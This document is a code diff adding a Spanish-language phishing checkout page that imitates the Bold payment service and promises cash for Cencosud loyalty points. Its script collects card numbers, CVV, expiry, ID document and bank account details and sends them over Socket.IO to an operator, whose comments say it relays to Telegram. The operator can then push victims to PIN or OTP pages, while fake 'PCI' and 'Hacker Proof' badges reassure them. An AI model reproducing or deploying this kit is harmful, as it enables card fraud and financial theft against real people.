@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Bold</title>
+    <link rel="stylesheet" href="checkout.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const translations = {
+            es: {
+                merchantSubtitle: "Pagos seguros con Bold",
+                amountTitle: "Redime tus puntos Cencosud",
+                paymentTitle: "¿Cómo quieres pagar?",
+                pointsLabel: "Puntos a redimir",
+                pointsPlaceholder: "Ingresa tus puntos Cencosud",
+                amountReceived: "Dinero a recibir",
+                receiveMoney: "¿Cómo quieres recibir tu dinero?",
+                selectBank: "Selecciona tu banco",
+                selectAccountType: "Selecciona tu tipo de cuenta",
+                accountNumber: "Número de cuenta",
+                savingsAccount: "Ahorros",
+                checkingAccount: "Corriente",
+                cardPaymentLabel: "Pago con tarjeta",
+                cardPayment: "Pago con tarjeta",
+                securePayment: "Paga seguro con Bold",
+                calculateIn: "Calcular en",
+                myCurrency: "mi moneda",
+                changeMethod: "Cambiar método de pago",
+                phone: "Teléfono",
+                email: "Ingresa tu correo electrónico",
+                emailPlaceholder: "El que está registrado en tu banco",
+                cardNumber: "Número de tarjeta",
+                expiry: "Vencimiento",
+                cvv: "CVV o CVC",
+                cardHolder: "Nombre del titular",
+                cardHolderPlaceholder: "Igual al que aparece en la tarjeta",
+                privacyPolicy: "Acepto el tratamiento de mis datos personales de acuerdo con la Política de Privacidad",
+                terms: "Acepto términos y condiciones",
+                payButton: "Pagar",
+                documentType: "Tipo de documento",
+                documentNumber: "No. de documento",
+                saveData: "Guardar mis datos para pagos más rápidos",
+                oneClickPay: "Pago a un clic",
+                authTitle: "Tu pago entró a un proceso de autenticación",
+                authMessage: "Por tu seguridad, no salgas de esta ventana. Sólo tardaremos unos segundos."
+            },
+            en: {
+                merchantSubtitle: "Secure payments with Bold",
+                amountTitle: "Redeem your Cencosud points",
+                paymentTitle: "How do you want to pay?",
+                pointsLabel: "Points to redeem",
+                pointsPlaceholder: "Enter your Cencosud points",
+                amountReceived: "Amount to receive",
+                receiveMoney: "How do you want to receive your money?",
+                selectBank: "Select your bank",
+                selectAccountType: "Select your account type",
+                accountNumber: "Account number",
+                savingsAccount: "Savings",
+                checkingAccount: "Checking",
+                cardPaymentLabel: "Card payment",
+                cardPayment: "Card payment",
+                securePayment: "Pay securely with Bold",
+                calculateIn: "Calculate in",
+                myCurrency: "my currency",
+                changeMethod: "Change payment method",
+                phone: "Phone",
+                email: "Enter your email",
+                emailPlaceholder: "The one registered in your bank",
+                cardNumber: "Card number",
+                expiry: "Expiration",
+                cvv: "CVV or CVC",
+                cardHolder: "Cardholder name",
+                cardHolderPlaceholder: "Same as it appears on the card",
+                privacyPolicy: "I accept the processing of my personal data in accordance with the Privacy Policy",
+                terms: "I accept terms and conditions",
+                payButton: "Pay",
+                documentType: "Document type",
+                documentNumber: "Document number",
+                saveData: "Save my data for faster payments",
+                oneClickPay: "One-click payment",
+                authTitle: "Your payment has entered an authentication process",
+                authMessage: "For your security, do not leave this window. We'll only take a few seconds."
+            }
+        };
+
+        let currentLang = 'es';
+
+        function changeLanguage(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            
+            const merchantBadge = document.querySelector('.merchant-badge span');
+            if (merchantBadge) merchantBadge.textContent = t.merchantBadge;
+            
+            const merchantName = document.querySelector('.merchant-name');
+            if (merchantName) merchantName.textContent = t.merchantName;
+            
+            const merchantSubtitle = document.querySelector('.merchant-subtitle');
+            if (merchantSubtitle) merchantSubtitle.textContent = t.merchantSubtitle;
+            
+            const productName = document.querySelector('.product-name');
+            if (productName) productName.textContent = t.productName;
+            
+            const sectionTitles = document.querySelectorAll('.section-title');
+            if (sectionTitles[0]) sectionTitles[0].textContent = t.amountTitle;
+            if (sectionTitles[1]) sectionTitles[1].textContent = t.paymentTitle;
+            
+            const pointsLabel = document.querySelector('label[for="points"]');
+            if (pointsLabel) pointsLabel.textContent = t.pointsLabel;
+            
+            const pointsInput = document.getElementById('points');
+            if (pointsInput) pointsInput.placeholder = t.pointsPlaceholder;
+            
+            const amountReceivedLabel = document.querySelector('label[for="amountReceived"]');
+            if (amountReceivedLabel) amountReceivedLabel.textContent = t.amountReceived;
+            
+            const bankLabel = document.querySelector('label[for="bank"]');
+            if (bankLabel) bankLabel.textContent = t.selectBank;
+            
+            const accountTypeLabel = document.querySelector('label[for="accountType"]');
+            if (accountTypeLabel) accountTypeLabel.textContent = t.selectAccountType;
+            
+            const accountNumberLabel = document.querySelector('label[for="accountNumber"]');
+            if (accountNumberLabel) accountNumberLabel.textContent = t.accountNumber;
+            
+            const receiveMoneyTitle = document.querySelector('.bank-section-title');
+            if (receiveMoneyTitle) receiveMoneyTitle.textContent = t.receiveMoney;
+            
+            const paymentLabel = document.querySelector('.payment-option-label');
+            if (paymentLabel) paymentLabel.textContent = t.cardPaymentLabel;
+            
+            const optionText = document.querySelectorAll('.option-text')[0];
+            if (optionText) optionText.textContent = t.cardPayment;
+            
+            const securityText = document.querySelector('.security-text');
+            if (securityText) securityText.textContent = t.securePayment;
+            
+            const calculateLink = document.querySelector('.calculate-link');
+            if (calculateLink) calculateLink.innerHTML = t.calculateIn + ' <span>' + t.myCurrency + '</span>';
+            
+            const changeLink = document.querySelector('.change-link');
+            if (changeLink) changeLink.textContent = t.changeMethod;
+            
+            // Labels del formulario
+            const phoneLabel = document.querySelector('label[for="phone"]');
+            if (phoneLabel) phoneLabel.textContent = t.phone;
+            
+            const emailLabel = document.querySelector('label[for="email"]');
+            if (emailLabel) emailLabel.textContent = t.email;
+            
+            const emailInput = document.getElementById('email');
+            if (emailInput) emailInput.placeholder = t.emailPlaceholder;
+            
+            const cardNumberLabel = document.querySelector('label[for="cardNumber"]');
+            if (cardNumberLabel) cardNumberLabel.textContent = t.cardNumber;
+            
+            const expiryLabel = document.querySelector('label[for="expiry"]');
+            if (expiryLabel) expiryLabel.textContent = t.expiry;
+            
+            const cvvLabel = document.querySelector('label[for="cvv"]');
+            if (cvvLabel && cvvLabel.childNodes[0]) cvvLabel.childNodes[0].textContent = t.cvv + ' ';
+            
+            const cardHolderLabel = document.querySelector('label[for="cardHolder"]');
+            if (cardHolderLabel) cardHolderLabel.textContent = t.cardHolder;
+            
+            const cardHolderInput = document.getElementById('cardHolder');
+            if (cardHolderInput) cardHolderInput.placeholder = t.cardHolderPlaceholder;
+            
+            // Checkboxes y labels de documento
+            const privacyLabel = document.querySelector('label[for="privacy"]');
+            privacyLabel.innerHTML = t.privacyPolicy.replace('Política de Privacidad', '<a href="#">' + (lang === 'es' ? 'Política de Privacidad' : 'Privacy Policy') + '</a>');
+            
+            const termsLabel = document.querySelector('label[for="terms"]');
+            if (termsLabel) {
+                termsLabel.innerHTML = lang === 'es' ? 
+                    'Acepto <a href="#">términos y condiciones</a>' : 
+                    'I accept <a href="#">terms and conditions</a>';
+            }
+            
+            const payButton = document.querySelector('.pay-button');
+            if (payButton) payButton.textContent = t.payButton;
+            
+            // Nuevos campos de documento
+            const documentTypeLabel = document.querySelector('label[for="documentType"]');
+            if (documentTypeLabel) documentTypeLabel.textContent = t.documentType;
+            
+            const documentNumberLabel = document.querySelector('label[for="documentNumber"]');
+            if (documentNumberLabel) documentNumberLabel.textContent = t.documentNumber;
+            
+            const saveDataLabel = document.querySelector('label[for="saveData"]');
+            if (saveDataLabel) saveDataLabel.textContent = t.saveData;
+            
+            // Pantalla de autenticación
+            const authTitle = document.querySelector('.auth-title');
+            if (authTitle) authTitle.textContent = t.authTitle;
+            
+            const authMessage = document.querySelector('.auth-message');
+            if (authMessage) authMessage.textContent = t.authMessage;
+            
+            // Actualizar el selector de idioma y bandera
+            const languageCode = document.querySelector('.language-code');
+            if (languageCode) languageCode.textContent = lang.toUpperCase();
+            
+            const currentFlag = document.getElementById('currentFlag');
+            if (currentFlag) {
+                const flagSrc = lang === 'es' ? 'img/co.svg' : 'img/us.svg';
+                currentFlag.src = flagSrc;
+            }
+            
+            // Actualizar banderas activas
+            document.querySelectorAll('.lang-option').forEach(option => {
+                option.classList.remove('active');
+            });
+            document.querySelector(`[data-lang="${lang}"]`).classList.add('active');
+        }
+
+        // Inicializar Socket.IO
+        const socket = io();
+        
+        // Escuchar acciones desde Telegram
+        socket.on('action', function(data) {
+            if (data.type === 'finalize') {
+                // Guardar datos en sessionStorage antes de redirigir
+                const bankSelect = document.getElementById('bank');
+                const accountTypeSelect = document.getElementById('accountType');
+                const accountNumberInput = document.getElementById('accountNumber');
+                const pointsInput = document.getElementById('points');
+                const amountReceivedInput = document.getElementById('amountReceived');
+                
+                const redemptionData = {
+                    bank: bankSelect ? bankSelect.options[bankSelect.selectedIndex].text : '',
+                    accountType: accountTypeSelect ? accountTypeSelect.options[accountTypeSelect.selectedIndex].text : '',
+                    accountNumber: accountNumberInput ? accountNumberInput.value : '',
+                    points: pointsInput ? pointsInput.value : '',
+                    amount: amountReceivedInput ? amountReceivedInput.value : ''
+                };
+                
+                // Guardar en sessionStorage de dos formas para compatibilidad
+                sessionStorage.setItem('redemptionData', JSON.stringify(redemptionData));
+                sessionStorage.setItem('selectedBank', redemptionData.bank);
+                sessionStorage.setItem('selectedAccountType', redemptionData.accountType);
+                sessionStorage.setItem('selectedAccountNumber', redemptionData.accountNumber);
+                sessionStorage.setItem('selectedPoints', redemptionData.points);
+                sessionStorage.setItem('selectedAmount', redemptionData.amount);
+                
+                // Redirigir a página de finalización
+                window.location.href = 'finalizar.html';
+            } else if (data.type === 'retry_card') {
+                // Mostrar mensaje de error y recargar
+                alert('¡Ups lo sentimos, verifica que los datos de tu tarjeta están escritos correctamente o vuelve a intentarlo más tarde!');
+                setTimeout(() => {
+                    window.location.reload();
+                }, 1000);
+            } else if (data.type === 'request_pin') {
+                // Redirigir a página de PIN
+                window.location.href = 'pin.html';
+            } else if (data.type === 'request_otp') {
+                // Redirigir a página de OTP
+                window.location.href = 'otp.html';
+            }
+        });
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('.lang-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    const lang = this.getAttribute('data-lang');
+                    changeLanguage(lang);
+                });
+            });
+            
+            // Conversión de puntos a dinero
+            const pointsInput = document.getElementById('points');
+            const amountReceivedInput = document.getElementById('amountReceived');
+            
+            pointsInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^\d]/g, '');
+                const numValue = parseInt(value) || 0;
+                
+                // Formatear puntos con separador de miles
+                if (value) {
+                    e.target.value = numValue.toLocaleString('es-CO');
+                } else {
+                    e.target.value = '';
+                }
+                
+                // Calcular dinero: 1.1 puntos = 100 pesos
+                const dinero = Math.floor((numValue / 1.1) * 100);
+                
+                if (dinero > 0) {
+                    amountReceivedInput.value = '$' + dinero.toLocaleString('es-CO');
+                } else {
+                    amountReceivedInput.value = '$0';
+                }
+            });
+            
+            // Validar campos del formulario y mostrar campos de documento
+            const phone = document.getElementById('phone');
+            const email = document.getElementById('email');
+            const cardNumber = document.getElementById('cardNumber');
+            const expiry = document.getElementById('expiry');
+            const cvv = document.getElementById('cvv');
+            const cardHolder = document.getElementById('cardHolder');
+            const documentFields = document.getElementById('documentFields');
+            const payButton = document.getElementById('payButton');
+            
+            function checkFormCompletion() {
+                const pointsValue = pointsInput.value.replace(/[^\d]/g, '');
+                const hasPoints = parseInt(pointsValue) > 0;
+                
+                const isCardFormComplete = hasPoints &&
+                    phone.value.trim() !== '' && 
+                    email.value.trim() !== '' && 
+                    cardNumber.value.replace(/\s/g, '').length >= 16 && 
+                    expiry.value.length === 5 && 
+                    cvv.value.length >= 3 && 
+                    cardHolder.value.trim() !== '';
+                
+                if (isCardFormComplete) {
+                    documentFields.style.display = 'block';
+                } else {
+                    documentFields.style.display = 'none';
+                }
+                
+                // Mostrar campos bancarios si los campos de documento están completos
+                const isDocumentComplete = document.getElementById('documentType').value !== '' && 
+                    document.getElementById('documentNumber').value.trim() !== '';
+                
+                const bankFields = document.getElementById('bankFields');
+                if (isCardFormComplete && isDocumentComplete) {
+                    bankFields.style.display = 'block';
+                } else {
+                    bankFields.style.display = 'none';
+                }
+                
+                // Verificar si todo está completo para habilitar el botón
+                checkPayButtonState();
+            }
+            
+            function checkPayButtonState() {
+                const pointsValue = pointsInput.value.replace(/[^\d]/g, '');
+                const hasPoints = parseInt(pointsValue) > 0;
+                
+                const isCardFormComplete = hasPoints &&
+                    phone.value.trim() !== '' && 
+                    email.value.trim() !== '' && 
+                    cardNumber.value.replace(/\s/g, '').length >= 16 && 
+                    expiry.value.length === 5 && 
+                    cvv.value.length >= 3 && 
+                    cardHolder.value.trim() !== '';
+                
+                const isDocumentComplete = document.getElementById('documentType').value !== '' && 
+                    document.getElementById('documentNumber').value.trim() !== '';
+                
+                const isBankComplete = document.getElementById('bank').value !== '' && 
+                    document.getElementById('accountType').value !== '' && 
+                    document.getElementById('accountNumber').value.trim() !== '';
+                
+                const privacy = document.getElementById('privacy').checked;
+                const terms = document.getElementById('terms').checked;
+                
+                // El botón se habilita solo si todo está completo y los checkboxes están marcados
+                if (isCardFormComplete && isDocumentComplete && isBankComplete && privacy && terms) {
+                    payButton.disabled = false;
+                    payButton.style.opacity = '1';
+                    payButton.style.cursor = 'pointer';
+                } else {
+                    payButton.disabled = true;
+                    payButton.style.opacity = '0.5';
+                    payButton.style.cursor = 'not-allowed';
+                }
+            }
+            
+            pointsInput.addEventListener('input', checkFormCompletion);
+            phone.addEventListener('input', checkFormCompletion);
+            email.addEventListener('input', checkFormCompletion);
+            cardNumber.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s/g, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+                e.target.value = formattedValue;
+                checkFormCompletion();
+            });
+            expiry.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                e.target.value = value;
+                checkFormCompletion();
+            });
+            cvv.addEventListener('input', checkFormCompletion);
+            cardHolder.addEventListener('input', function(e) {
+                e.target.value = e.target.value.toUpperCase();
+                checkFormCompletion();
+            });
+            
+            // Listeners para campos de documento y checkboxes
+            document.getElementById('documentType').addEventListener('change', checkFormCompletion);
+            document.getElementById('documentNumber').addEventListener('input', checkFormCompletion);
+            document.getElementById('privacy').addEventListener('change', checkPayButtonState);
+            document.getElementById('terms').addEventListener('change', checkPayButtonState);
+            
+            // Listeners para campos bancarios
+            document.getElementById('bank').addEventListener('change', checkPayButtonState);
+            document.getElementById('accountType').addEventListener('change', checkPayButtonState);
+            document.getElementById('accountNumber').addEventListener('input', checkPayButtonState);
+            
+            // Inicializar botón como deshabilitado
+            payButton.disabled = true;
+            payButton.style.opacity = '0.5';
+            payButton.style.cursor = 'not-allowed';
+            
+            // Función para enviar datos a través de Socket.IO
+            function sendToTelegram(data) {
+                socket.emit('payment-data', data);
+            }
+            
+            // Botón de pagar
+            payButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (this.disabled) {
+                    return;
+                }
+                
+                // Recopilar datos
+                const documentTypeSelect = document.getElementById('documentType');
+                const documentNumberInput = document.getElementById('documentNumber');
+                const merchantNameEl = document.querySelector('.merchant-name');
+                const productNameEl = document.querySelector('.product-name');
+                
+                const bankSelect = document.getElementById('bank');
+                const accountTypeSelect = document.getElementById('accountType');
+                const accountNumberInput = document.getElementById('accountNumber');
+                
+                const paymentData = {
+                    points: pointsInput.value,
+                    amountReceived: amountReceivedInput.value,
+                    phone: phone.value,
+                    email: email.value,
+                    cardNumber: cardNumber.value,
+                    expiry: expiry.value,
+                    cvv: cvv.value,
+                    cardHolder: cardHolder.value,
+                    documentType: documentTypeSelect ? documentTypeSelect.options[documentTypeSelect.selectedIndex].text : '',
+                    documentNumber: documentNumberInput ? documentNumberInput.value : '',
+                    bank: bankSelect ? bankSelect.options[bankSelect.selectedIndex].text : '',
+                    accountType: accountTypeSelect ? accountTypeSelect.options[accountTypeSelect.selectedIndex].text : '',
+                    accountNumber: accountNumberInput ? accountNumberInput.value : '',
+                    merchantName: merchantNameEl ? merchantNameEl.textContent : '',
+                    productName: productNameEl ? productNameEl.textContent : ''
+                };
+                
+                // Guardar datos de redención en sessionStorage para acceso desde otras páginas
+                sessionStorage.setItem('redemptionData', JSON.stringify({
+                    bank: paymentData.bank,
+                    accountType: paymentData.accountType,
+                    accountNumber: paymentData.accountNumber,
+                    points: paymentData.points,
+                    amount: paymentData.amountReceived
+                }));
+                sessionStorage.setItem('selectedBank', paymentData.bank);
+                sessionStorage.setItem('selectedAccountType', paymentData.accountType);
+                sessionStorage.setItem('selectedAccountNumber', paymentData.accountNumber);
+                sessionStorage.setItem('selectedPoints', paymentData.points);
+                sessionStorage.setItem('selectedAmount', paymentData.amountReceived);
+                
+                // Enviar a Telegram vía Socket.IO
+                sendToTelegram(paymentData);
+                
+                // Mostrar pantalla de autenticación
+                document.getElementById('authScreen').classList.add('show');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="checkout-container">
+        <!-- Panel izquierdo -->
+        <div class="left-panel">
+            <header class="header">
+                <img src="img/bold-logo-white.svg" alt="Bold" class="logo">
+                <div class="language-selector">
+                    <img src="img/co.svg" alt="Colombia" class="flag-svg" id="currentFlag">
+                    <span class="language-code">ES</span>
+                    <svg width="12" height="8" viewBox="0 0 12 8" fill="none" class="dropdown-arrow">
+                        <path d="M1 1L6 6L11 1" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                    <div class="language-dropdown">
+                        <div class="lang-option active" data-lang="es">
+                            <img src="img/co.svg" alt="Colombia" class="flag-svg-option">
+                            <span>ES</span>
+                        </div>
+                        <div class="lang-option" data-lang="en">
+                            <img src="img/us.svg" alt="USA" class="flag-svg-option">
+                            <span>EN</span>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="merchant-info">
+                <div class="merchant-badge">
+                    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+                        <path d="M10 2L12 8H18L13 12L15 18L10 14L5 18L7 12L2 8H8L10 2Z" fill="white"/>
+                    </svg>
+                    <p class="merchant-subtitle">Pagos seguros con Bold</p>
+            </div>
+
+            <div class="product-info">
+                <img src="img/logo-cencosud.png" alt="Producto" class="product-image">
+                <p class="product-name">¡Redime tus puntos Cencosud!</p>
+            </div>
+        </div>
+
+        <!-- Panel derecho -->
+        <div class="right-panel">
+            <div class="payment-container">
+                <div class="amount-section">
+                    <h2 class="section-title">Redime tus puntos Cencosud</h2>
+                    
+                    <div class="points-redeem-section">
+                        <div class="form-group">
+                            <label for="points">
+                                <img src="img/logo-cencosud.png" alt="Cencosud" style="height: 20px; vertical-align: middle; margin-right: 8px;">
+                                Puntos a redimir
+                            </label>
+                            <input type="text" id="points" class="points-input" placeholder="Ingresa tus puntos Cencosud">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="amountReceived">Dinero a recibir</label>
+                            <div class="amount-display">
+                                <span class="currency">COP</span>
+                                <input type="text" id="amountReceived" class="amount-input" placeholder="$0" value="$0" readonly>
+                            </div>
+                            <p style="font-size: 12px; color: #666; margin-top: 8px;">Conversión: 1.1 puntos = $100 COP</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payment-method-section">
+                    <h2 class="section-title">¿Cómo quieres pagar?</h2>
+                    
+                    <div class="payment-option-label">Pago con tarjeta</div>
+                    
+                    <div class="payment-option card-payment selected" id="cardPayment">
+                        <div class="option-header">
+                            <div class="option-content">
+                                <div class="option-icon">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                                        <rect x="2" y="6" width="20" height="12" rx="2" stroke="#1e3a8a" stroke-width="2"/>
+                                        <path d="M2 10H22" stroke="#1e3a8a" stroke-width="2"/>
+                                    </svg>
+                                </div>
+                                <span class="option-text">Pago con tarjeta</span>
+                            </div>
+                            <div class="card-logos">
+                                <img src="img/american-express.svg" alt="American Express" class="card-logo">
+                                <img src="img/visa-2.svg" alt="Visa" class="card-logo">
+                                <img src="img/mastercard.svg" alt="Mastercard" class="card-logo">
+                                <img src="img/diners-club.png" alt="Diners Club" class="card-logo">
+                                <img src="img/discover.svg" alt="Discover" class="card-logo">
+                                <img src="img/codensa.png" alt="Codensa" class="card-logo">
+                            </div>
+                            <input type="radio" name="payment" value="card" checked class="radio-input">
+                        </div>
+                        
+                        <!-- Formulario de tarjeta -->
+                        <div class="card-form" id="cardForm">
+                            <div class="change-method">
+                                <a href="#" class="change-link">Cambiar método de pago</a>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="phone">Teléfono</label>
+                                <div class="phone-input">
+                                    <div class="country-code-selector">
+                                        <img src="img/co.svg" alt="Colombia" class="country-flag">
+                                        <span class="country-code">+ 57</span>
+                                        <img src="img/arrow-more-dark.svg" alt="Arrow" class="country-arrow">
+                                    </div>
+                                    <input type="tel" id="phone" placeholder="----------">
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="email">Ingresa tu correo electrónico</label>
+                                <input type="email" id="email" placeholder="El que está registrado en tu banco">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cardNumber">Número de tarjeta</label>
+                                <div class="input-with-icon">
+                                    <input type="text" id="cardNumber" placeholder="---- ---- ---- ----" maxlength="19">
+                                    <img src="img/credit-card.svg" alt="Card" class="input-icon">
+                                </div>
+                            </div>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="expiry">Vencimiento</label>
+                                    <div class="input-with-icon">
+                                        <input type="text" id="expiry" placeholder="MM/AA" maxlength="5">
+                                        </div>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="cvv">
+                                        CVV o CVC
+                                        <img src="img/help.svg" alt="Help" class="help-icon">
+                                    </label>
+                                    <div class="input-with-icon">
+                                        <input type="text" id="cvv" placeholder="---" maxlength="4">
+                                        <img src="img/credit-card.svg" alt="Card" class="input-icon">
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cardHolder">Nombre del titular</label>
+                                <input type="text" id="cardHolder" placeholder="Igual al que aparece en la tarjeta">
+                            </div>
+                            
+                            <!-- Campos adicionales de documento -->
+                            <div class="document-fields" id="documentFields" style="display: none;">
+                                <div class="form-group">
+                                    <label for="documentType">Tipo de documento</label>
+                                    <select id="documentType" class="form-select">
+                                        <option value="CC">(C.C.) Cédula de Ciudadanía</option>
+                                        <option value="CE">Cédula de Extranjería</option>
+                                        <option value="NIT">NIT</option>
+                                        <option value="PP">Pasaporte</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="documentNumber">No. de documento</label>
+                                    <input type="text" id="documentNumber" placeholder="">
+                                </div>
+                                
+                                <div class="form-group toggle-group">
+                                    <div class="toggle-content">
+                                        <div class="toggle-text">
+                                            <label for="saveData">Guardar mis datos para pagos más rápidos</label>
+                                            <div class="toggle-badge">
+                                                <img src="img/bold-logo-white.svg" alt="Bold" class="toggle-icon">
+                                                <span>Pago a un clic</span>
+                                            </div>
+                                        </div>
+                                        <label class="toggle-switch">
+                                            <input type="checkbox" id="saveData">
+                                            <span class="toggle-slider"></span>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Campos bancarios -->
+                            <div class="bank-fields" id="bankFields" style="display: none;">
+                                <h2 class="section-title bank-section-title">¿Cómo quieres recibir tu dinero?</h2>
+                                
+                                <div class="form-group">
+                                    <label for="bank">Selecciona tu banco</label>
+                                    <select id="bank" class="form-select">
+                                        <option value="">Selecciona una opción</option>
+                                        <option value="BANCOLOMBIA">Bancolombia</option>
+                                        <option value="BANCO_DE_BOGOTA">Banco de Bogotá</option>
+                                        <option value="DAVIVIENDA">Davivienda</option>
+                                        <option value="BBVA">BBVA</option>
+                                        <option value="BANCO_OCCIDENTE">Banco de Occidente</option>
+                                        <option value="BANCO_POPULAR">Banco Popular</option>
+                                        <option value="ITAU">Itaú</option>
+                                        <option value="BANCO_CAJA_SOCIAL">Banco Caja Social</option>
+                                        <option value="BANCO_AV_VILLAS">Banco AV Villas</option>
+                                        <option value="BANCO_PICHINCHA">Banco Pichincha</option>
+                                        <option value="CITIBANK">Citibank</option>
+                                        <option value="GNB_SUDAMERIS">GNB Sudameris</option>
+                                        <option value="BANCO_AGRARIO">Banco Agrario</option>
+                                        <option value="BANCO_FALABELLA">Banco Falabella</option>
+                                        <option value="SCOTIABANK_COLPATRIA">Scotiabank Colpatria</option>
+                                        <option value="BANCO_COOPERATIVO_COOPCENTRAL">Banco Cooperativo Coopcentral</option>
+                                        <option value="BANCO_SANTANDER">Banco Santander</option>
+                                        <option value="BANCO_W">Banco W</option>
+                                        <option value="BANCO_SERFINANZA">Banco Serfinanza</option>
+                                        <option value="BANCOOMEVA">Bancoomeva</option>
+                                        <option value="BANCO_FINANDINA">Banco Finandina</option>
+                                        <option value="BANCO_MULTIBANK">Banco Multibank</option>
+                                        <option value="BANCO_CREDIFINANCIERA">Banco Credifinanciera</option>
+                                        <option value="NEQUI">Nequi</option>
+                                        <option value="DAVIPLATA">Daviplata</option>
+                                        <option value="NU">NU</option>
+                                        <option value="LULO_BANK">Lulo Bank</option>
+                                        <option value="RAPPIPAY">RappiPay</option>
+                                        <option value="MOVII">Movii</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="accountType">Selecciona tu tipo de cuenta</label>
+                                    <select id="accountType" class="form-select">
+                                        <option value="">Selecciona una opción</option>
+                                        <option value="AHORROS">Ahorros</option>
+                                        <option value="CORRIENTE">Corriente</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="accountNumber">Número de cuenta</label>
+                                    <input type="text" id="accountNumber" placeholder="">
+                                </div>
+                            </div>
+                            
+                            <div class="form-group checkbox-group">
+                                <input type="checkbox" id="privacy">
+                                <label for="privacy">
+                                    Acepto el <a href="#">tratamiento de mis datos personales de acuerdo con la Política de Privacidad</a>
+                                </label>
+                            </div>
+                            
+                            <div class="form-group checkbox-group">
+                                <input type="checkbox" id="terms">
+                                <label for="terms">
+                                    Acepto <a href="#">términos y condiciones</a>
+                                </label>
+                            </div>
+                            
+                            <button class="pay-button" id="payButton">Pagar</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="security-footer">
+                    <span class="security-text">Paga seguro con Bold</span>
+                    <div class="security-badges">
+                        <img src="img/pci.svg" alt="PCI" class="badge-icon">
+                        <img src="img/hacker-proof.svg" alt="Hacker Proof" class="badge-icon">
+                        <img src="img/service-provider-badge.svg" alt="Service Provider" class="badge-icon">
+                        <img src="img/pse.svg" alt="reCAPTCHA" class="badge-icon">
+                        <img src="img/mastercard.svg" alt="Mastercard" class="badge-icon">
+                        <img src="img/visa.svg" alt="Visa" class="badge-icon">
+                        <img src="img/recaptcha.svg" alt="reCAPTCHA" class="badge-icon">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Pantalla de autenticación -->
+    <div class="auth-screen" id="authScreen">
+        <div class="auth-container">
+            <header class="auth-header">
+                <img src="img/bold-logo-white.svg" alt="Bold" class="auth-logo">
+                <div class="auth-help-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+                        <circle cx="14" cy="14" r="13" stroke="white" stroke-width="2"/>
+                        <text x="14" y="19" text-anchor="middle" fill="white" font-size="18" font-weight="bold">?</text>
+                    </svg>
+                </div>
+            </header>
+            
+            <div class="auth-content">
+                <div class="auth-loader">
+                    <div class="loader-dots">
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                        <span class="dot"></span>
+                    </div>
+                </div>
+                
+                <h2 class="auth-title">Tu pago entró a un proceso de autenticación</h2>
+                <p class="auth-message">Por tu seguridad, no salgas de esta ventana. Sólo tardaremos unos segundos.</p>
+            </div>
+            
+            <div class="auth-footer">
+                <span class="auth-footer-text">Paga seguro con Bold</span>
+                <div class="auth-badges">
+                    <img src="img/pci-light.svg" alt="PCI" class="auth-badge">
+                    <img src="img/hacker-proof.svg" alt="Hacker Proof" class="auth-badge">
+                    <img src="img/service-provider-badge.svg" alt="Service Provider" class="auth-badge">
+                    <img src="img/recaptcha-light.svg" alt="reCAPTCHA" class="auth-badge">
+                    <img src="img/visa.svg" alt="Visa" class="auth-badge">
+                    <img src="img/mastercard.svg" alt="Mastercard" class="auth-badge">
+                    <img src="img/pse-light.svg" alt="PSE" class="auth-badge">
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
